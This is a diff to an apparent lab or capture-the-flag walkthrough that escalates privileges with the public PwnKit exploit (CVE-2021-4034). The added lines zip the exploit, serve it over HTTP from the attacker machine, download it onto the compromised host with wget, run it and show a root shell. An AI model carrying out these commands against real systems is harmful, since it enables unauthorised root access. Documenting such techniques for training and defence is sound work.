@@ -259,7 +259,7 @@ some manual editing of the exploits have to be done:
 
             $ git clone https://github.com/berdav/CVE-2021-4034.git
             $ cd CVE-2021-4034
-            $ls
+            $ ls
             convert.sh       cve-2021-4034.sh  LICENSE   pwnkit.c   vuln-setup.sh
             cve-2021-4034.c  dry-run           Makefile  README.md
             $ nano cve-2021-4034.c --> change the path of /usr/bin/pkexec to /opt/pkexec as follow:
@@ -306,3 +306,13 @@ some manual editing of the exploits have to be done:
             
 now the exploit is manually configured. Zip the whole directory and transfer to the target machine
 
+            $ zip -r CVE-2021-4034.zip CVE-2021-4034/
+            $ python3 -m http.server
+
+            www-data@engineer:/home/cybercraze$ cd /tmp
+            www-data@engineer:/tmp$ wget 192.168.0.163:8000/CVE-2021-4034.zip
+            www-data@engineer:/tmp$ unzip CVE-2021-4034.zip
+            www-data@engineer:/tmp$ cd CVE-2021-4034
+            www-data@engineer:/tmp/CVE-2021-4034$ ./cve-2021-4034
+            # whoami
+            root
